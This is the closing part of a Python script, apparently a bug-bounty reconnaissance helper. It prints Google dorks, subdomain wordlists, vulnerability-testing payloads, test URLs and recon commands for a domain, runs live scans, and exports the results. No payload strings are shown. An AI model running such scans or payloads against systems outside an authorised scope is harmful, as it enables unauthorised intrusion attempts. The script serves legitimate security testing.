                        print(f"     Rewards: {prog['reward_range']}")
                    print()
            else:
                print("📊 No matching programs found")
                print("   Check your filters or try a different domain")
                print()

        # Generate Google dorks
        if args.dorks or args.vuln_dorks:
            dorks = randomizer.generate_dorks(domain, args.vuln_dorks)
            result['info']['dorks'] = dorks
            print(f"🔍 Google Dorks:")
            for dork in dorks:
                print(f"  {dork}")
            print()

        # Generate technology dorks
        if args.tech_dorks:
            tech_dorks = randomizer.get_technology_stack_dorks(domain)
            result['info']['tech_dorks'] = tech_dorks
            print(f"⚙️  Technology Discovery Dorks:")
            for dork in tech_dorks:
                print(f"  {dork}")
            print()

        # Generate subdomain wordlist
        if args.wordlist:
            subdomains = randomizer.get_subdomain_wordlist(domain)
            result['info']['subdomains'] = subdomains
            print(f"📝 Subdomain Wordlist (showing first 20):")
            for subdomain in subdomains[:20]:
                print(f"  {subdomain}.{domain.replace('*.', '')}")
            print(f"  ... and {len(subdomains) - 20} more")
            print()

        # Generate vulnerability testing payloads
        if args.payloads:
            payloads = randomizer.generate_payload_list(domain, args.payloads)
            result['info']['payloads'] = payloads
            print(f"💣 {args.payloads.upper()} Testing Payloads:")
            for payload in payloads[:10]:
                print(f"  {payload}")
            if len(payloads) > 10:
                print(f"  ... and {len(payloads) - 10} more payloads")
            print()

        # Generate vulnerability test URLs
        if args.test_urls:
            test_urls = randomizer.get_vulnerability_test_urls(domain)
            result['info']['test_urls'] = test_urls
            print(f"🧪 Vulnerability Test URLs:")
            for vuln_type, urls in test_urls.items():
                print(f"  📂 {vuln_type}:")
                for url in urls[:2]:  # Show first 2 URLs per category
                    print(f"    {url}")
                if len(urls) > 2:
                    print(f"    ... and {len(urls) - 2} more URLs")
                print()

        # Show reconnaissance commands
        if args.recon:
            commands = randomizer.get_reconnaissance_commands(domain)
            result['info']['recon_commands'] = commands
            print(f"🔍 Reconnaissance Commands:")
            for category, cat_commands in commands.items():
                print(f"  📂 {category}:")
                for tool, command in list(cat_commands.items())[:3]:  # Show first 3 per category
                    print(f"    {tool}: {command}")
                if len(cat_commands) > 3:
                    print(f"    ... and {len(cat_commands) - 3} more {category.lower()} commands")
                print()

        # Live check
        if args.live_check or args.basic_scan:
            print(f"🔄 Checking target availability...")
            randomizer.run_basic_scan(domain.replace('*.', ''))

        # Run htmlq scan
        if args.htmlq:
            print(f"🔧 Running htmlq scan...")
            randomizer.run_htmlq_scan(domain.replace('*.', ''))

        results.append(result)

    # Export results if requested
    if args.export and results:
        export_file = f"bounty_targets.{args.export}"

        if args.export == 'json':
            import json
            with open(export_file, 'w') as f:
                json.dump(results, f, indent=2)
        elif args.export == 'csv':
            import csv
            with open(export_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Domain', 'Risk_Rating', 'Programs', 'Bounties', 'Platforms', 'Attack_Surface'])
                for result in results:
                    programs = result['info'].get('programs', {}).get('programs', [])
                    enhanced = result['info'].get('enhanced', {})
                    bounties = sum(1 for p in programs if p.get('offers_bounties', False))
                    platforms = ', '.join(set(p['platform'] for p in programs))
                    attack_surface = ', '.join(enhanced.get('potential_attack_surface', []))
                    risk_rating = enhanced.get('risk_rating', 'Unknown')
                    writer.writerow([result['domain'], risk_rating, len(programs), bounties, platforms, attack_surface])
        elif args.export == 'txt':
            with open(export_file, 'w') as f:
                for result in results:
                    f.write(f"Target: {result['domain']}\n")
                    enhanced = result['info'].get('enhanced', {})
                    if enhanced:
                        f.write(f"Risk Rating: {enhanced.get('risk_rating', 'Unknown')}\n")
                        f.write(f"Attack Surface: {', '.join(enhanced.get('potential_attack_surface', []))}\n")
                    if 'dorks' in result['info']:
                        f.write("Dorks:\n")
                        for dork in result['info']['dorks']:
                            f.write(f"  {dork}\n")
                    f.write("\n")

        print(f"\n💾 Results exported to: {export_file}")

    print("\n" + "=" * 60)
    print("✅ Randomization complete!")
    print(f"📈 Repository stats: {randomizer.repo_info['total_programs']} programs, {randomizer.repo_info['total_domains']} domains, {randomizer.repo_info['total_wildcards']} wildcards")

if __name__ == "__main__":
    main()
